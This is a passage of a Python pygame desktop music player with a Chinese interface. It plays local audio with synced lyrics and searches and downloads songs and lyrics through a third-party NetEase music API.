        err(f"{t.__name__}: {v}")
    sys.excepthook = _hook

    start("正在启动 GUI 版本，请稍后...")
    pygame.init()
    pygame.mixer.init()

    W, H = 900, 640
    screen = pygame.display.set_mode((W, H))
    pygame.display.set_caption(WINDOW_TITLE)

    F_TITLE = pygame.font.Font(FONT_TITLE, F_TITLE_SIZE)
    F_NORM  = pygame.font.Font(FONT_NORM, F_NORM_SIZE)
    F_SMALL = pygame.font.Font(FONT_SMALL, F_SMALL_SIZE)

    if WINDOW_ICON:
        try:
            icon = pygame.image.load(WINDOW_ICON)
            pygame.display.set_icon(icon)
            info(f"图标已加载: {WINDOW_ICON}")
        except Exception as e:
            warn(f"图标加载失败: {e}")

    BG_IMAGE = None
    if BG_IMAGE_PATH:
        try:
            img = pygame.image.load(BG_IMAGE_PATH).convert()
            iw, ih = img.get_size()
            scale = max(W / iw, H / ih)
            nw, nh = int(iw * scale), int(ih * scale)
            img = pygame.transform.smoothscale(img, (nw, nh))
            x = (nw - W) // 2
            y = (nh - H) // 2
            BG_IMAGE = img.subsurface((x, y, W, H))
            info(f"背景图已加载: {BG_IMAGE_PATH}")
        except Exception as e:
            warn(f"背景图加载失败: {e}")
            BG_IMAGE = None

    DL_HEADERS = {
        "User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                       "AppleWebKit/537.36 (KHTML, like Gecko) "
                       "Chrome/126.0.0.0 Safari/537.36"),
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
    }
    DL_URI = "https://node.api.xfabe.com/api/wangyi/music?type=json&id="

    def fill_bg(s):
        if BG_IMAGE:
            s.blit(BG_IMAGE, (0, 0))
            if BG_DIM > 0:
                veil = pygame.Surface((W, H), pygame.SRCALPHA)
                veil.fill((0, 0, 0, BG_DIM))
                s.blit(veil, (0, 0))
        else:
            s.fill(C_BG)

    def panel_rect(s, x, y, w, h, base_color):
        surf = pygame.Surface((w, h), pygame.SRCALPHA)
        surf.fill((*base_color, PANEL_ALPHA))
        s.blit(surf, (x, y))

    class Btn:
        def __init__(self, x, y, w, h, text, color=None):
            self.rect = pygame.Rect(x, y, w, h)
            self.text = text
            self.hover = False
            self.color = color or C_BTN
        def draw(self, s):
            c = C_BTN_HOV if self.hover else self.color
            pygame.draw.rect(s, c, self.rect, border_radius=8)
            pygame.draw.rect(s, C_ACCENT2, self.rect, width=1, border_radius=8)
            t = F_SMALL.render(self.text, True, C_WHITE)
            s.blit(t, (self.rect.x + (self.rect.w - t.get_width()) // 2,
                       self.rect.y + (self.rect.h - t.get_height()) // 2))
        def hover_check(self, mx, my):
            self.hover = self.rect.collidepoint(mx, my)
        def hit(self, mx, my):
            return self.rect.collidepoint(mx, my)

    class Lrc:
        def __init__(self):
            self.t = []; self.x = []; self.has = False
        def load(self, path):
            self.t, self.x, self.has = [], [], False
            if not os.path.exists(path):
                return False
            try:
                a, b = local_lrc(path)
                self.t, self.x = a, b
                self.has = len(a) > 0 and len(a) == len(b)
            except Exception as e:
                warn(f"歌词加载失败: {e}")
            return self.has
        def idx(self, sec):
            if not self.t or sec < self.t[0]:
                return -1
            lo, hi = 0, len(self.t) - 1
            while lo < hi:
                mid = (lo + hi + 1) // 2
                if self.t[mid] <= sec:
                    lo = mid
                else:
                    hi = mid - 1
            return lo
        def win(self, sec, ctx=5):
            i = self.idx(sec)
            if i < 0:
                return []
            a = max(0, i - ctx)
            b = min(len(self.x), i + ctx + 1)
            return [(j, self.x[j], j == i) for j in range(a, b)]

    class Audio:
        def __init__(self):
            self.list = []
            self.idx = -1
            self.playing = False
            self.paused = False
            self.dur = 0.0
            self.flag = 0.0
            self.pause_pos = 0.0
            self.vol = 0.7
            self.lrc = Lrc()
            self.has_lrc = False
        def scan(self, folder):
            self.list.clear()
            exts = ('.mp3', '.wav', '.ogg', '.flac', '.m4a')
            try:
                for f in sorted(os.listdir(folder)):
                    if f.lower().endswith(exts):
                        self.list.append(os.path.join(folder, f))
            except FileNotFoundError:
                warn(f"目录不存在: {folder}")
            return len(self.list)
        def load(self, i):
            if not (0 <= i < len(self.list)):
                return
            self.idx = i
            p = self.list[i]
            pygame.mixer.music.load(p)
            pygame.mixer.music.play()
            pygame.mixer.music.set_volume(self.vol)
            try:
                self.dur = pygame.mixer.Sound(p).get_length()
            except Exception:
                self.dur = 0.0
            info(f"播放: {os.path.basename(p)}  时长: {self.dur:.2f}s")
            self.playing, self.paused, self.flag, self.pause_pos = True, False, 0.0, 0.0
            lp = os.path.splitext(p)[0] + ".lrc"
            self.has_lrc = self.lrc.load(lp)
            if self.has_lrc:
                info(f"歌词已加载: {len(self.lrc.t)} 行")
            else:
                warn(f"未找到歌词: {lp}")
        def toggle(self):
            if self.playing and not self.paused:
                self.pause_pos = self.real_now()
                pygame.mixer.music.pause()
                self.paused = True
                info("暂停")
            elif self.playing and self.paused:
                pygame.mixer.music.unpause()
                p = pygame.mixer.music.get_pos()
                self.flag = self.pause_pos - p / 1000.0
                self.paused = False
                info("继续")
            elif self.list:
                self.load(0)
        def stop(self):
            pygame.mixer.music.stop()
            self.playing, self.paused, self.flag, self.pause_pos = False, False, 0.0, 0.0
            info("停止播放")
        def nxt(self):
            if self.list:
                self.load((self.idx + 1) % len(self.list))
        def prv(self):
            if self.list:
                self.load((self.idx - 1) % len(self.list))
        def now(self):
            if not self.playing or self.paused:
                return self.pause_pos
            p = pygame.mixer.music.get_pos()
            return p / 1000.0 if p >= 0 else 0.0
        def real_now(self):
            if not self.playing or self.paused:
                return self.pause_pos
            return self.now() + self.flag
        def pct(self):
            return (self.real_now() / self.dur * 100) if self.dur > 0 else 0.0
        def seek(self, s):
            if self.dur <= 0:
                return
            s = max(0.0, min(s, self.dur))
            pygame.mixer.music.rewind()
            pygame.mixer.music.set_pos(s)
            p = pygame.mixer.music.get_pos()
            self.flag = s - p / 1000.0 if p >= 0 else s
            self.pause_pos = s
        def jump(self, o):
            if self.playing:
                self.seek(self.real_now() + o)
        def set_vol(self, v):
            self.vol = max(0.0, min(1.0, v))
            pygame.mixer.music.set_volume(self.vol)
        def ended(self):
            if self.playing and not self.paused:
                if not pygame.mixer.music.get_busy() and self.real_now() > 1:
                    self.nxt()

    def download_song(song_id, display_name):
        try:
            url = DL_URI + str(song_id)
            info(f"请求下载信息: id={song_id}")
            response = requests.get(url=url, headers=DL_HEADERS, timeout=10)
            music_data = response.json()
            d = music_data.get("data") or {}
            download_url = d.get("url") or d.get("download_url")
            real_id = d.get("id") or song_id
            info(f"返回码: {music_data.get('code')}  状态: {music_data.get('msg')}")
            if not download_url or download_url == "None":
                warn("无可用下载链接")
                return False
            fname = display_name.replace("/", "_").replace("\\", "_")
            base = str(MUSIC_DIR) if MUSIC_DIR.is_dir() else "."
            mp3_path = os.path.join(base, f"{fname}.mp3")
            lrc_path = os.path.join(base, f"{fname}.lrc")
            info(f"下载链接: {download_url}")
            download_file(download_url, mp3_path)
            info(f"音频已保存: {mp3_path}")
            music_lrc = get_music("lyrics", real_id, 1)
            if isinstance(music_lrc, str) and music_lrc.strip():
                with open(lrc_path, "w", encoding="utf-8") as f:
                    f.write(music_lrc)
                info(f"歌词已写入: {lrc_path}")
            else:
                warn(f"歌词为空，未写入: {lrc_path}")
            return True
        except Exception as e:
            err(f"下载失败: {e}")
            return False

    def fmt(ms):
        total_sec = int(ms) // 1000
        m, s = divmod(total_sec, 60)
        h, m = divmod(m, 60)
        if h:
            return f"{h:02d}:{m:02d}:{s:02d}"
        return f"{m:02d}:{s:02d}"

    def draw_bar(s, a):
        pygame.draw.rect(s, C_BAR_BG, (BAR_X, BAR_Y, BAR_W, BAR_H), border_radius=6)
        fw = int(BAR_W * a.pct() / 100)
        if fw > 0:
            pygame.draw.rect(s, C_BAR_FILL, (BAR_X, BAR_Y, fw, BAR_H), border_radius=6)
        dx, dy = BAR_X + fw, BAR_Y + BAR_H // 2
        pygame.draw.circle(s, C_WHITE, (dx, dy), 7)
        pygame.draw.circle(s, C_ACCENT, (dx, dy), 5)
        now_ms = a.now() * 1000
        end_ms = a.dur * 1000
        t1 = fmt(now_ms + a.flag * 1000)
        t2 = fmt(end_ms)
        s.blit(F_SMALL.render(f"{t1} / {t2}", True, C_TEXT), (BAR_X + BAR_W + 10, BAR_Y - 4))

    def list_scrollbar_rect(a, scroll):
        vis = LIST_H // 26
        total = len(a.list)
        if total <= vis:
            return None
        sx = LIST_X + LIST_W - 12
        sy = LIST_Y + 6
        sh = vis * 26
        return sx, sy, 6, sh, vis, total

    def draw_list(s, a, scroll):
        panel_rect(s, LIST_X, LIST_Y, LIST_W, LIST_H, C_PANEL)
        pygame.draw.rect(s, C_ACCENT2, (LIST_X, LIST_Y, LIST_W, LIST_H), width=1, border_radius=10)
        s.blit(F_NORM.render("播放列表", True, C_ACCENT), (LIST_X + 12, LIST_Y - 30))
        vis = LIST_H // 26
        for i in range(scroll, min(len(a.list), scroll + vis)):
            name = os.path.basename(a.list[i])
            if len(name) > 24:
                name = name[:22] + ".."
            r = pygame.Rect(LIST_X + 6, LIST_Y + 6 + (i - scroll) * 26, LIST_W - 18, 24)
            if i == a.idx:
                pygame.draw.rect(s, C_SEL, r, border_radius=5)
            c = C_ACCENT if i == a.idx else C_TEXT
            s.blit(F_SMALL.render(f"{i+1:02d}. {name}", True, c), (r.x + 8, r.y + 4))
        sb = list_scrollbar_rect(a, scroll)
        if sb:
            sx, sy, sw, sh, vis2, total = sb
            pygame.draw.rect(s, C_BAR_BG, (sx, sy, sw, sh), border_radius=3)
            thumb_h = max(20, int(sh * vis2 / total))
            thumb_y = sy + int((sh - thumb_h) * scroll / max(1, total - vis2))
            pygame.draw.rect(s, C_ACCENT, (sx, thumb_y, sw, thumb_h), border_radius=3)

    def draw_lyric(s, a):
        panel_rect(s, LYRIC_X, LYRIC_Y, LYRIC_W, LYRIC_H, C_PANEL)
        pygame.draw.rect(s, C_ACCENT2, (LYRIC_X, LYRIC_Y, LYRIC_W, LYRIC_H), width=1, border_radius=10)
        s.blit(F_NORM.render("歌词", True, C_ACCENT), (LYRIC_X + 12, LYRIC_Y - 30))
        if not a.has_lrc:
            t = F_NORM.render("暂无歌词", True, C_DIM)
            s.blit(t, (LYRIC_X + (LYRIC_W - t.get_width()) // 2, LYRIC_Y + LYRIC_H // 2 - 12))
            return
        rows = a.lrc.win(a.real_now(), 5)
        if not rows:
            return
        lh = 30
        sy = LYRIC_Y + (LYRIC_H - lh * len(rows)) // 2 + 10
        for i, (j, txt, cur) in enumerate(rows):
            ly = sy + i * lh
            if cur:
                pygame.draw.circle(s, C_ACCENT, (LYRIC_X + 18, ly + lh // 2), 4)
                c = C_ACCENT
                tx = LYRIC_X + 34
            else:
                d = abs(i - len(rows) // 2)
                g = max(70, 210 - d * 30)
                c = (g, g, g + 20)
                tx = LYRIC_X + 24
            s.blit(F_SMALL.render(txt, True, c), (tx, ly))

    def draw_vol(s, a):
        pygame.draw.rect(s, C_BAR_BG, (VOL_X, VOL_Y, VOL_W, 6), border_radius=3)
        fw = int(VOL_W * a.vol)
        pygame.draw.rect(s, C_ACCENT, (VOL_X, VOL_Y, fw, 6), border_radius=3)
        pygame.draw.circle(s, C_WHITE, (VOL_X + fw, VOL_Y + 3), 6)
        s.blit(F_SMALL.render(f"音量 {int(a.vol*100)}%", True, C_TEXT), (VOL_X, VOL_Y - 20))

    def draw_modal(s, title, lines, buttons, hover_states=None):
        mw, mh = 460, 200
        mx = (W - mw) // 2
        my = (H - mh) // 2
        overlay = pygame.Surface((W, H), pygame.SRCALPHA)
        overlay.fill((0, 0, 0, 150))
        s.blit(overlay, (0, 0))
        panel_rect(s, mx, my, mw, mh, C_PANEL2)
        pygame.draw.rect(s, C_ACCENT, (mx, my, mw, mh), width=2, border_radius=14)
        s.blit(F_NORM.render(title, True, C_ACCENT), (mx + 24, my + 20))
        for i, line in enumerate(lines):
            s.blit(F_SMALL.render(line, True, C_TEXT), (mx + 24, my + 60 + i * 26))
        btn_w, btn_h, gap = 120, 36, 20
        total = len(buttons) * btn_w + (len(buttons) - 1) * gap
        bx = mx + (mw - total) // 2
        by = my + mh - 56
        rects = []
        for i, (txt, col) in enumerate(buttons):
            r = pygame.Rect(bx + i * (btn_w + gap), by, btn_w, btn_h)
            hov = hover_states[i] if hover_states else False
            c = C_BTN_HOV if hov else (col or C_BTN)
            pygame.draw.rect(s, c, r, border_radius=8)
            pygame.draw.rect(s, C_ACCENT2, r, width=1, border_radius=8)
            t = F_SMALL.render(txt, True, C_WHITE)
            s.blit(t, (r.x + (r.w - t.get_width()) // 2, r.y + (r.h - t.get_height()) // 2))
            rects.append(r)
        return rects

    class SearchPanel:
        def __init__(self):
            self.open = False
            self.text = ""
            self.results = []
            self.cursor = 0
            self.scroll = 0
            self.max_visible = 7
            self.msg = ""
            self.caret_tick = 0
            self.busy = False
            self.drag_scroll = False
            self.limit = 30
            self.editing_limit = False
            self.limit_text = ""
            self.w, self.h = 720, 480
            self.x = (W - self.w) // 2
            self.y = (H - self.h) // 2
            self.input_rect = pygame.Rect(self.x + 24, self.y + 60, self.w - 48, 40)
            self.btn_clear = Btn(self.x + self.w - 480, self.y + self.h - 56, 100, 36,
                                 "清空", C_BTN)
            self.btn_limit = Btn(self.x + self.w - 360, self.y + self.h - 56, 100, 36,
                                 "阈值", C_BTN)
            self.btn_ok = Btn(self.x + self.w - 240, self.y + self.h - 56, 100, 36,
                              "搜索", C_ACCENT2)
            self.btn_cancel = Btn(self.x + self.w - 128, self.y + self.h - 56, 100, 36,
                                  "取消", C_DANGER)

        def ensure_visible(self):
            if self.cursor < self.scroll:
                self.scroll = self.cursor
            elif self.cursor >= self.scroll + self.max_visible:
                self.scroll = self.cursor - self.max_visible + 1

        def scrollbar_rect(self):
            if len(self.results) <= self.max_visible:
                return None
            sx = self.x + self.w - 16
            sy = self.y + 140
            sh = self.max_visible * 32
            return sx, sy, 6, sh

        def update_scroll_from_mouse(self, my):
            sb = self.scrollbar_rect()
            if not sb:
                return
            sx, sy, sw, sh = sb
            thumb_h = max(20, int(sh * self.max_visible / len(self.results)))
            travel = sh - thumb_h
            if travel <= 0:
                return
            rel = max(0.0, min(1.0, (my - sy - thumb_h / 2) / travel))
            self.scroll = int(rel * max(0, len(self.results) - self.max_visible))

        def clear(self):
            self.text = ""
            self.results = []
            self.cursor = 0
            self.scroll = 0
            self.msg = ""
            self.busy = False
            self.editing_limit = False
            self.limit_text = ""
            info("已清空搜索结果")

        def query(self):
            if not self.text.strip():
                warn("搜索关键词为空")
                self.msg = "请输入关键词"
                return
            info(f"搜索关键词: {self.text}  阈值: {self.limit}")
            self.msg = "搜索中..."
            self.busy = True
            try:
                r = get_music("search", self.text, self.limit)
                if isinstance(r, int) or r is None:
                    self.msg = "搜索失败"
                    self.results = []
                    warn("搜索失败")
                else:
                    names, artists, albums, durations, ids = r
                    self.results = []
                    for i in range(len(names)):
                        self.results.append({
                            "name": names[i],
                            "artist": artists[i],
                            "album": albums[i],
                            "duration": durations[i],
                            "id": ids[i],
                        })
                    self.msg = f"找到 {len(self.results)} 首"
                    info(f"搜索结果: {len(self.results)} 首")
            except Exception as e:
                err(f"搜索异常: {e}")
                self.msg = "搜索异常"
                self.results = []
            self.cursor = 0
            self.scroll = 0
            self.busy = False

        def pick(self):
            if not (self.results and self.cursor < len(self.results)):
                warn("未选中任何结果")
                return None
            return self.results[self.cursor]

        def draw(self, s, dt):
            overlay = pygame.Surface((W, H), pygame.SRCALPHA)
            overlay.fill((0, 0, 0, 140))
            s.blit(overlay, (0, 0))
            panel_rect(s, self.x, self.y, self.w, self.h, C_PANEL2)
            pygame.draw.rect(s, C_ACCENT, (self.x, self.y, self.w, self.h), width=2, border_radius=14)
            s.blit(F_NORM.render("在线搜索", True, C_ACCENT), (self.x + 24, self.y + 18))

            pygame.draw.rect(s, C_BG, self.input_rect, border_radius=8)
            pygame.draw.rect(s, C_ACCENT2, self.input_rect, width=1, border_radius=8)
            self.caret_tick += dt
            ts = F_SMALL.render(self.text, True, C_TEXT)
            tx = self.input_rect.x + 10
            ty = self.input_rect.y + (self.input_rect.h - ts.get_height()) // 2
            s.blit(ts, (tx, ty))
            if (self.caret_tick // 500) % 2 == 0:
                cx = tx + ts.get_width() + 1
                pygame.draw.line(s, C_ACCENT,
                                 (cx, self.input_rect.y + 8),
                                 (cx, self.input_rect.y + self.input_rect.h - 8), 2)

            s.blit(F_SMALL.render(self.msg, True, C_DIM), (self.x + 24, self.y + 112))

            ly = self.y + 140
            for k in range(self.scroll, min(len(self.results), self.scroll + self.max_visible)):
                item = self.results[k]
                i = k - self.scroll
                line = f"{k+1:02d}. {item['name']} - {item['artist']}  [{item['duration']}]"
                if len(line) > 46:
                    line = line[:44] + ".."
                r = pygame.Rect(self.x + 24, ly + i * 32, self.w - 48, 28)
                if k == self.cursor:
                    pygame.draw.rect(s, C_SEL, r, border_radius=6)
                s.blit(F_SMALL.render(line, True,
                                      C_ACCENT if k == self.cursor else C_TEXT),
                       (r.x + 8, r.y + 4))

            sb = self.scrollbar_rect()
            if sb:
                sx, sy, sw, sh = sb
                pygame.draw.rect(s, C_BAR_BG, (sx, sy, sw, sh), border_radius=3)
                thumb_h = max(20, int(sh * self.max_visible / len(self.results)))
                thumb_y = sy + int((sh - thumb_h) * self.scroll / max(1, len(self.results) - self.max_visible))
                pygame.draw.rect(s, C_ACCENT, (sx, thumb_y, sw, thumb_h), border_radius=3)

            has_pick = bool(self.results and self.cursor < len(self.results))
            self.btn_ok.text = "下载" if has_pick else "搜索"
            self.btn_ok.color = C_ACCENT if has_pick else C_ACCENT2
            self.btn_clear.draw(s)
            self.btn_limit.draw(s)
            self.btn_ok.draw(s)
            self.btn_cancel.draw(s)

            if self.editing_limit:
                lx, ly2 = self.x + 24, self.y + self.h - 120
                pygame.draw.rect(s, C_BG, (lx, ly2, 260, 36), border_radius=8)
                pygame.draw.rect(s, C_ACCENT, (lx, ly2, 260, 36), width=1, border_radius=8)
                s.blit(F_SMALL.render(f"搜索阈值: {self.limit_text}_", True, C_TEXT),
                       (lx + 10, ly2 + 9))

        def handle_event(self, event):
            if self.editing_limit:
                if event.type == pygame.KEYDOWN:
                    if event.key == pygame.K_ESCAPE:
                        self.editing_limit = False
                        info("取消修改阈值")
                        return True
                    elif event.key == pygame.K_RETURN:
                        try:
                            v = int(self.limit_text)
                            if 1 <= v <= 100:
                                self.limit = v
                                info(f"搜索阈值改为: {self.limit}")
                            else:
                                warn("阈值需在 1~100 之间")
                        except ValueError:
                            warn("阈值必须是整数")
                        self.editing_limit = False
                        return True
                    elif event.key == pygame.K_BACKSPACE:
                        self.limit_text = self.limit_text[:-1]
                        return True
                    elif event.unicode and event.unicode.isdigit():
                        self.limit_text += event.unicode
                        return True
                return True

            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_ESCAPE:
                    self.open = False
                    info("关闭搜索面板")
                    return True
                elif event.key == pygame.K_RETURN:
                    if self.results and self.cursor < len(self.results):
                        it = self.pick()
                        if it:
                            return ("download", it)
                    else:
                        self.query()
                    return True
                elif event.key == pygame.K_BACKSPACE:
                    self.text = self.text[:-1]
                    return True
                elif event.key == pygame.K_UP:
                    self.cursor = max(0, self.cursor - 1)
                    self.ensure_visible()
                    return True
                elif event.key == pygame.K_DOWN:
                    self.cursor = min(max(0, len(self.results) - 1), self.cursor + 1)
                    self.ensure_visible()
                    return True
                elif event.unicode and event.unicode.isprintable():
                    self.text += event.unicode
                    return True
            elif event.type == pygame.MOUSEWHEEL:
                if self.results:
                    self.scroll = max(0, min(max(0, len(self.results) - self.max_visible),
                                             self.scroll - event.y))
                return True
            elif event.type == pygame.MOUSEMOTION:
                mx, my = event.pos
                if self.drag_scroll:
                    self.update_scroll_from_mouse(my)
                    return True
                self.btn_clear.hover_check(mx, my)
                self.btn_limit.hover_check(mx, my)
                self.btn_ok.hover_check(mx, my)
                self.btn_cancel.hover_check(mx, my)
            elif event.type == pygame.MOUSEBUTTONDOWN:
                mx, my = event.pos
                sb = self.scrollbar_rect()
                if sb:
                    sx, sy, sw, sh = sb
                    if sx <= mx <= sx + sw and sy <= my <= sy + sh:
                        self.drag_scroll = True
                        self.update_scroll_from_mouse(my)
                        return True
                if self.btn_clear.hit(mx, my):
                    self.clear()
                    return True
                if self.btn_limit.hit(mx, my):
                    self.editing_limit = True
                    self.limit_text = str(self.limit)
                    info("修改搜索阈值")
                    return True
                if self.btn_ok.hit(mx, my):
                    if self.results and self.cursor < len(self.results):
                        it = self.pick()
                        if it:
                            return ("download", it)
                    else:
                        self.query()
                    return True
                if self.btn_cancel.hit(mx, my):
                    self.open = False
                    info("取消搜索")
                    return True
                if self.input_rect.collidepoint(mx, my):
                    return True
                for k in range(self.scroll, min(len(self.results), self.scroll + self.max_visible)):
                    i = k - self.scroll
                    r = pygame.Rect(self.x + 24, self.y + 140 + i * 32, self.w - 48, 28)
                    if r.collidepoint(mx, my):
                        self.cursor = k
                        return True
            elif event.type == pygame.MOUSEBUTTONUP:
                if self.drag_scroll:
                    self.drag_scroll = False
                    return True
            return False

    a = Audio()
    info(f"加载音乐目录: {MUSIC_DIR}")
    cnt = a.scan(MUSIC_DIR if MUSIC_DIR.is_dir() else Path("."))
    info(f"已加载 {cnt} 首歌曲")

    b_prev = Btn(60, 540, 90, 34, "上一首")
    b_play = Btn(160, 540, 90, 34, "播放")
    b_stop = Btn(260, 540, 90, 34, "停止")
    b_next = Btn(360, 540, 90, 34, "下一首")
    b_srch = Btn(460, 540, 90, 34, "搜索", C_ACCENT2)
    b_reload = Btn(560, 540, 80, 34, "刷新", C_BTN)
    b_del = Btn(650, 540, 80, 34, "删除", C_DANGER)
    buttons = [b_prev, b_play, b_stop, b_next, b_srch, b_reload, b_del]

    panel = SearchPanel()
    scroll = 0
    drag_p = drag_v = False
    drag_list_scroll = False

    downloading = {"active": False, "name": ""}
    deleting = {"active": False, "idx": -1, "hover": [False, False]}

    info("进入主循环")
    running = True
    clock = pygame.time.Clock()
    while running:
        dt = clock.tick(60)

        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                info("关闭窗口")
                running = False
                continue

            if deleting["active"]:
                mw, mh = 460, 200
                mx0 = (W - mw) // 2
                my0 = (H - mh) // 2
                btn_w, btn_h, gap = 120, 36, 20
                total = 2 * btn_w + gap
                bx = mx0 + (mw - total) // 2
                by = my0 + mh - 56
                r_yes = pygame.Rect(bx, by, btn_w, btn_h)
                r_no = pygame.Rect(bx + btn_w + gap, by, btn_w, btn_h)
                if event.type == pygame.MOUSEMOTION:
                    mx, my = event.pos
                    deleting["hover"][0] = r_yes.collidepoint(mx, my)
                    deleting["hover"][1] = r_no.collidepoint(mx, my)
                elif event.type == pygame.MOUSEBUTTONDOWN:
                    mx, my = event.pos
                    if r_yes.collidepoint(mx, my):
                        i = deleting["idx"]
                        if 0 <= i < len(a.list):
                            mp3 = a.list[i]
                            lrc = os.path.splitext(mp3)[0] + ".lrc"
                            try:
                                if os.path.exists(mp3):
                                    os.remove(mp3)
                                    info(f"删除音频: {mp3}")
                                else:
                                    warn(f"音频不存在: {mp3}")
                                if os.path.exists(lrc):
                                    os.remove(lrc)
                                    info(f"删除歌词: {lrc}")
                                else:
                                    warn(f"歌词不存在: {lrc}")
                            except Exception as e:
                                err(f"删除失败: {e}")
                            was_current = (i == a.idx)
                            a.scan(MUSIC_DIR if MUSIC_DIR.is_dir() else Path("."))
                            if was_current:
                                a.stop()
                            if a.idx >= len(a.list):
                                a.idx = len(a.list) - 1
                            scroll = 0
                        deleting["active"] = False
                        deleting["idx"] = -1
                    elif r_no.collidepoint(mx, my):
                        info("取消删除")
                        deleting["active"] = False
                        deleting["idx"] = -1
                continue

            if downloading["active"]:
                continue

            if panel.open:
                res = panel.handle_event(event)
                if res is True:
                    continue
                if isinstance(res, tuple) and res[0] == "download":
                    it = res[1]
                    downloading["active"] = True
                    downloading["name"] = f"{it['name']} - {it['artist']}"
                    continue

            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_ESCAPE:
                    running = False
                elif event.key == pygame.K_SPACE:
                    a.toggle()
                elif event.key == pygame.K_s:
                    a.stop()
                elif event.key == pygame.K_RIGHT:
                    a.jump(5); info(f"快进 5s -> {a.real_now():.1f}s")
                elif event.key == pygame.K_LEFT:
                    a.jump(-5); info(f"快退 5s -> {a.real_now():.1f}s")
                elif event.key == pygame.K_n:
                    a.nxt()
                elif event.key == pygame.K_p:
                    a.prv()
                elif event.key == pygame.K_UP:
                    a.set_vol(a.vol + 0.05)
                    info(f"音量: {int(a.vol*100)}%")
                elif event.key == pygame.K_DOWN:
                    a.set_vol(a.vol - 0.05)
                    info(f"音量: {int(a.vol*100)}%")
                elif event.key == pygame.K_f:
                    panel.open = True; panel.msg = ""; info("打开搜索面板")

            elif event.type == pygame.MOUSEBUTTONDOWN and not panel.open:
                mx, my = event.pos
                sb = list_scrollbar_rect(a, scroll)
                if sb:
                    sx, sy, sw, sh, vis2, total = sb
                    if sx <= mx <= sx + sw and sy <= my <= sy + sh:
                        drag_list_scroll = True
                        thumb_h = max(20, int(sh * vis2 / total))
                        travel = sh - thumb_h
                        if travel > 0:
                            rel = max(0.0, min(1.0, (my - sy - thumb_h / 2) / travel))
                            scroll = int(rel * max(0, total - vis2))
                        continue
                if b_prev.hit(mx, my):
                    a.prv()
                elif b_play.hit(mx, my):
                    a.toggle()
                elif b_stop.hit(mx, my):
                    a.stop()
                elif b_next.hit(mx, my):
                    a.nxt()
                elif b_srch.hit(mx, my):
                    panel.open = True; panel.msg = ""; info("按钮: 搜索")
                elif b_reload.hit(mx, my):
                    cnt = a.scan(MUSIC_DIR if MUSIC_DIR.is_dir() else Path("."))
                    info(f"刷新列表: {cnt} 首")
                    scroll = 0
                elif b_del.hit(mx, my):
                    if 0 <= a.idx < len(a.list):
                        deleting["active"] = True
                        deleting["idx"] = a.idx
                        info(f"请求删除: {os.path.basename(a.list[a.idx])}")
                    else:
                        warn("没有选中的歌曲")
                if BAR_X - 10 <= mx <= BAR_X + BAR_W + 10 and BAR_Y - 8 <= my <= BAR_Y + BAR_H + 8:
                    drag_p = True
                    a.seek(max(0.0, min(1.0, (mx - BAR_X) / BAR_W)) * a.dur)
                    info(f"进度跳转: {a.real_now():.1f}s")
                if VOL_X - 10 <= mx <= VOL_X + VOL_W + 10 and VOL_Y - 8 <= my <= VOL_Y + 14:
                    drag_v = True
                    a.set_vol(max(0.0, min(1.0, (mx - VOL_X) / VOL_W)))
                if LIST_X <= mx <= LIST_X + LIST_W - 12 and LIST_Y <= my <= LIST_Y + LIST_H:
                    row = (my - LIST_Y - 6) // 26 + scroll
                    if 0 <= row < len(a.list):
                        a.load(row)
                        info(f"点击列表: {row+1}")

            elif event.type == pygame.MOUSEBUTTONUP:
                drag_p = drag_v = False
                drag_list_scroll = False

            elif event.type == pygame.MOUSEMOTION and not panel.open:
                mx, my = event.pos
                if drag_list_scroll:
                    sb = list_scrollbar_rect(a, scroll)
                    if sb:
                        sx, sy, sw, sh, vis2, total = sb
                        thumb_h = max(20, int(sh * vis2 / total))
                        travel = sh - thumb_h
                        if travel > 0:
                            rel = max(0.0, min(1.0, (my - sy - thumb_h / 2) / travel))
                            scroll = int(rel * max(0, total - vis2))
                    continue
                if drag_p:
                    a.seek(max(0.0, min(1.0, (mx - BAR_X) / BAR_W)) * a.dur)
                if drag_v:
                    a.set_vol(max(0.0, min(1.0, (mx - VOL_X) / VOL_W)))
                for b in buttons:
                    b.hover_check(mx, my)

            elif event.type == pygame.MOUSEWHEEL and not panel.open:
                scroll_max = max(0, len(a.list) - 12)
                scroll = max(0, min(scroll_max, scroll - event.y))

        a.ended()

        if downloading["active"]:
            name = downloading["name"]
            it_id = None
            if panel.results:
                for it in panel.results:
                    if f"{it['name']} - {it['artist']}" == name:
                        it_id = it["id"]
                        break
            fill_bg(screen)
            screen.blit(F_TITLE.render(WINDOW_TITLE, True, C_ACCENT), (60, 20))
            draw_modal(screen, "下载中", [f"正在下载: {name}", "请稍候..."], [])
            pygame.display.flip()
            if it_id is not None:
                ok = download_song(it_id, name)
                if ok:
                    cnt = a.scan(MUSIC_DIR if MUSIC_DIR.is_dir() else Path("."))
                    info(f"下载后刷新列表: {cnt} 首")
                else:
                    warn("下载失败")
            downloading["active"] = False
            continue

        if a.paused:
            b_play.text = "继续"
        elif a.playing:
            b_play.text = "暂停"
        else:
            b_play.text = "播放"

        fill_bg(screen)
        screen.blit(F_TITLE.render(WINDOW_TITLE, True, C_ACCENT), (60, 20))

        if a.idx >= 0 and a.list:
            name = os.path.basename(a.list[a.idx])
            if len(name) > 46:
                name = name[:44] + ".."
            info_s = F_NORM.render(f"正在播放: {name}", True, C_TEXT)
        else:
            info_s = F_NORM.render("未在播放", True, C_DIM)
        screen.blit(info_s, (60, 420))

        draw_bar(screen, a)
        draw_list(screen, a, scroll)
        draw_lyric(screen, a)
        draw_vol(screen, a)
        for b in buttons:
            b.draw(screen)

        hint = F_SMALL.render(
            "空格:播放/暂停  S:停止  ←→:快退/快进  N/P:上下首  ↑↓:音量  F:搜索",
            True, C_DIM
        )
        screen.blit(hint, (60, 610))

        if panel.open:
            panel.draw(screen, dt)

        if deleting["active"]:
            idx = deleting["idx"]
            fname = os.path.basename(a.list[idx]) if 0 <= idx < len(a.list) else "?"
            draw_modal(
                screen, "确认删除",
                [f"文件: {fname}", "同时删除同名 .lrc 歌词文件"],
                [("删除", C_DANGER), ("取消", C_BTN)],
                deleting["hover"]
            )

        pygame.display.flip()

    info("退出，释放资源")
    pygame.quit()
    info("程序结束")
    GUI_MODE = False
    sys.exit(0)
    
def main():
   mun = 30
